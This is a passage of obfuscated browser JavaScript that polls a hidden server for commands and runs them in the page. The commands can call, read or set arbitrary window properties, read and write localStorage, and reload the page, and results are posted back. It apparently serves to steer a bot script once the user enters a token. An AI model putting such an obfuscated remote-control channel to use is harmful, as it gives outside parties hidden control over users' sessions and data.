    function url(p, extra) { return base + p + _0xstr(0x8e5) + tk + _0xstr(0x8e6) + pid + (extra || ''); }
    function vis() { return document.visibilityState === _0xstr(0x8e7) ? 1 : 0; }
    function clean(v) {
        if (v === undefined)
            return null;
        try {
            return JSON.parse(JSON.stringify(v));
        }
        catch (e) {
            return String(v);
        }
    }
    function resolve(path) {
        if (typeof path !== _0xstr(0x8e8) || !ALLOW.test(path) || BAD.test(path))
            throw new Error(_0xstr(0x8e9));
        var p = path.split(_0xstr(0x8ea)), o = window;
        for (var i = 0; i < p.length - 1; i++) {
            o = o[p[i]];
            if (o == null)
                throw new Error(_0xstr(0x8eb) + p.slice(0, i + 1).join(_0xstr(0x8ec)));
        }
        return { o: o, k: p[p.length - 1] };
    }
    function state() {
        var o = { host: location.hostname };
        if (window.PSLite)
            o.lite = PSLite.get();
        if (window.PSBot) {
            var s = PSBot.state;
            o.bot = { on: !!s.on, done: s.done, target: s.target, debug: !!s.debug };
        }
        try {
            o.run = JSON.parse(localStorage.getItem(_0xstr(0x8ed)) || _0xstr(0x8ee));
        }
        catch (e) {
            o.run = {};
        }
        return o;
    }
    function exec(c) {
        var r;
        switch (c.op) {
            case _0xstr(0x8ef):
                r = resolve(c.path);
                if (typeof r.o[r.k] !== _0xstr(0x8f0))
                    throw new Error(_0xstr(0x8f1) + c.path);
                return r.o[r.k].apply(r.o, c.args || []);
            case _0xstr(0x8f2):
                r = resolve(c.path);
                return r.o[r.k];
            case _0xstr(0x8f3):
                r = resolve(c.path);
                r.o[r.k] = c.val;
                return true;
            case _0xstr(0x8f4):
                return state();
            case _0xstr(0x8f5):
                if (!/^[a-zA-Z]+$/.test(c.key || ''))
                    throw new Error(_0xstr(0x8f6));
                var k = _0xstr(0x8f7), o = {};
                try {
                    o = JSON.parse(localStorage.getItem(k) || _0xstr(0x8f8));
                }
                catch (e) {
                    o = {};
                }
                o[c.key] = String(c.val);
                localStorage.setItem(k, JSON.stringify(o));
                return true;
            case _0xstr(0x8f9):
                setTimeout(function () { location.reload(); }, 150);
                return true;
        }
        throw new Error(_0xstr(0x8fa));
    }
    function report(id, body) {
        body.id = id;
        fetch(url(_0xstr(0x8fb)), { method: _0xstr(0x8fc), body: JSON.stringify(body), headers: { 'Content-Type': _0xstr(0x8fd) } }).catch(function () { });
    }
    function run(c) {
        Promise.resolve().then(function () { return exec(c); }).then(function (v) { report(c.id, { v: clean(v) }); }, function (e) { report(c.id, { err: String((e && e.message) || e) }); });
    }
    function loop() {
        var extra = _0xstr(0x8fe) + encodeURIComponent(location.hostname) + _0xstr(0x8ff) + vis() + (hello ? _0xstr(0x900) : '');
        hello = false;
        fetch(url(_0xstr(0x901), extra), { cache: _0xstr(0x902) })
            .then(function (r) {
            if (r.status === 403) {
                dead = true;
                try {
                    localStorage.removeItem(_0xstr(0x903));
                }
                catch (e) { }
                throw new Error(_0xstr(0x904));
            }
            if (!r.ok)
                throw new Error(_0xstr(0x905) + r.status);
            return r.json();
        })
            .then(function (c) { if (c && c.id)
            run(c); setTimeout(loop, 0); })
            .catch(function () { if (dead)
            return; hello = true; setTimeout(loop, 3000); });
    }
    document.addEventListener(_0xstr(0x906), function () {
        fetch(url(_0xstr(0x907), _0xstr(0x908) + vis()), { method: _0xstr(0x909), body: '', headers: { 'Content-Type': _0xstr(0x90a) } }).catch(function () { });
    });
    function start() {
        var t = '';
        try {
            t = localStorage.getItem(_0xstr(0x90b)) || '';
        }
        catch (e) { }
        if (!/^[0-9a-f]{32}$/i.test(t)) {
            t = String(window.prompt(_0xstr(0x90c)) || '').trim();
            if (!/^[0-9a-f]{32}$/i.test(t))
                return;
            try {
                localStorage.setItem(_0xstr(0x90d), t);
            }
            catch (e) { }
        }
        tk = encodeURIComponent(t);
        loop();
    }
    if (document.readyState === _0xstr(0x90e))
        document.addEventListener(_0xstr(0x90f), start);
    else
        start();
})();
